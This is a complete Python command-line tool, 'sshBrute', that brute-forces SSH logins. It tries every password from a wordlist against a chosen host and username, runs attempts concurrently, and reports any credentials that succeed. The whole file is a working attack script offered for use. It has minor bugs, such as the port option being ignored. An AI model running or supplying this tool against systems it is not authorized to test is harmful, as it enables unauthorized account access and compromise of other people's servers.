#!/usr/bin/env python3


import argparse
import asyncio
import asyncssh
from os import path
from sys import exit
from datetime import datetime
from termcolor import colored


def print_banner():
    print("""
                  __    ____             __         
       __________/ /_  / __ )_______  __/ /____     
      / ___/ ___/ __ \/ __  / ___/ / / / __/ _ \\   
     (__  |__  ) / / / /_/ / /  / /_/ / /_/  __/    
    /____/____/_/ /_/_____/_/   \__,_/\__/\___/     

    """)


def get_args():
    parser = argparse.ArgumentParser(description="SSH Bruteforcer")

    parser.add_argument('target', type=str, help="host to attack on e.g. 93.184.216.34")
    parser.add_argument('-p', '--port', dest='port', default=22, required=False, type=int, help="port to attack on, default:22")
    parser.add_argument('-w', '--wordlist', dest='wordlist', required=True, type=str, help="list of passwords to use")
    parser.add_argument('-u', '--username', dest='username', required=True, type=str, help="username to use")

    args = parser.parse_args()

    return args


async def ssh_bruteforce(target, port, username, password, found_flag):
    try:
        async with asyncssh.connect(host=target, username=username, password=password) as conn:
            found_flag.set()

            print(colored(f"[{port}] [SSH] Target:{target} Username:{username} Password:{password}", 'green'))

    except Exception as err:
        print(f"[Attempt] Target:{target} Username:{username} Password:{password}")


async def main(target, port, username, wordlist):
    tasks = []
    passwords = []
    found_flag = asyncio.Event()
    concurrency_limit = 10
    counter = 0

    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            passwords.append(password)

    for password in passwords:
        if counter >= concurrency_limit:
            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            tasks = []
            counter = 0

        if not found_flag.is_set():
            tasks.append(asyncio.create_task(ssh_bruteforce(target, port, username, password, found_flag)))
            await asyncio.sleep(0.5)
            counter += 1

    await asyncio.gather(*tasks)

    if not found_flag.is_set():
        print(colored("\n[-] Failed to find the correct password"), 'red')


if __name__ == '__main__':
    print_banner()

    args = get_args()

    if not path.exists(args.wordlist):
        print(colored(f"[-] {args.wordlist} : No such file or directory", 'red'))
        exit(1)

    print('\n'+'-'*100+'\n'+'-'*100+'\n')

    print(colored(f"[*] Target\t: {args.target}", "light_red"))
    print(colored(f"[*] Port\t: {args.port}", "light_red"))
    print(colored(f"[*] Username\t: {args.username}", "light_red"))
    print(colored(f"[*] Wordlist\t: {args.wordlist}", "light_red"))
    print(colored(f"[*] Protocol\t: SSH", "light_red"))

    print('\n'+'-'*100+'\n'+'-'*100+'\n')

    print(colored(f"SSH bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", "yellow"))

    print('\n'+'-'*100+'\n'+'-'*100+'\n')

    asyncio.run(main(args.target, args.port, args.username, args.wordlist))
